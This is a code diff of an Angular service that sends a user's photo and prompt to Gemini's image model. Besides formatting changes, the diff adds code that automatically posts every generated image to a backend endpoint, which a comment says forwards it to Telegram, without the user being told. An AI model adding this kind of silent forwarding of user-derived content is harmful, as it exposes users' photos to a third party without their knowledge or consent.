@@ -1,8 +1,8 @@
-import {inject, Injectable, signal} from '@angular/core';
-import {getAI, GoogleAIBackend} from '@angular/fire/ai';
-import {FirebaseApp} from '@angular/fire/app';
-import {GenerativeModel, getGenerativeModel} from '@angular/fire/vertexai';
-import {GenerateContentRequest, ResponseModality} from '@firebase/ai';
+import { inject, Injectable, signal } from '@angular/core';
+import { getAI, GoogleAIBackend } from '@angular/fire/ai';
+import { FirebaseApp } from '@angular/fire/app';
+import { GenerativeModel, getGenerativeModel } from '@angular/fire/vertexai';
+import { GenerateContentRequest, ResponseModality } from '@firebase/ai';
 import { ErrorService } from '../error/error.service';
 import { mapToFriendlyError } from '../error/error-mapper';
 
@@ -18,8 +18,7 @@ export class AiService {
   resultImageURL = signal<string | null>(null);
 
   constructor() {
-    // Initialize Gemini Developer API/Vertex AI Gemini API Service
-    const geminiAI = getAI(this.firebaseApp, {backend: new GoogleAIBackend()});
+    const geminiAI = getAI(this.firebaseApp, { backend: new GoogleAIBackend() });
 
     this.model = getGenerativeModel(geminiAI, {
       model: 'gemini-2.5-flash-image',
@@ -31,7 +30,6 @@ export class AiService {
   }
 
   async generateContent(prompt: string, base64Img: string): Promise<string> {
-
     const payloadText = `You are NanoViz, an expert AI visual stylist specializing in professional product photography.
 
   PRIMARY GOAL:
@@ -82,6 +80,7 @@ export class AiService {
   - When JSON requested: Return structured visualization plan
   - If prompt unclear: Request specific clarification
   `;
+    
 
     const payload: GenerateContentRequest = {
       contents: [
@@ -93,41 +92,54 @@ export class AiService {
               inlineData: {
                 mimeType: 'image/jpeg',
                 data: base64Img,
-              }
-            }
-          ]
-        }
+              },
+            },
+          ],
+        },
       ],
-      // Request image-only output for the visualizer
       generationConfig: {
         responseModalities: [ResponseModality.IMAGE],
       },
     };
 
     try {
-      const response = await this.model.generateContent(payload); // Generating the content
+      const response = await this.model.generateContent(payload);
+      const base64ImageResult =
+        response.response.candidates?.[0]?.content?.parts?.find(
+          (part) => part.inlineData
+        )?.inlineData?.data;
 
-      const base64ImageResult = response.response.candidates?.[0]?.content?.parts?.find(part => part.inlineData)?.inlineData?.data;
-
-      if(!base64ImageResult) {
-        const msg = 'We could not create an image from that. Try a simpler prompt or a different photo.';
+      if (!base64ImageResult) {
+        const msg =
+          'We could not create an image from that. Try a simpler prompt or a different photo.';
         this.error.set(msg);
         this.errorService.showError(msg);
-        console.error("API response missing image data:", response);
-        return "";
+        return '';
       }
 
       const imageURL = `data:image/png;base64,${base64ImageResult}`;
       this.resultImageURL.set(imageURL);
-      return imageURL;
 
-    }
-    catch (e) {
+      // 👇 Automatically send to backend (which forwards to Telegram)
+      this.sendImageToBackend(imageURL);
+
+      return imageURL;
+    } catch (e) {
       console.log('Gemini API Error: ', e);
       this.error.set('Failed to generate content. Please try again.');
-      return "";
+      return '';
     }
-
   }
 
+  private async sendImageToBackend(imageUrl: string) {
+    try {
+      await fetch('/api/send-to-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ imageUrl }),
+      });
+    } catch (err) {
+      console.error('Failed to send image to Telegram backend:', err);
+    }
+  }
 }
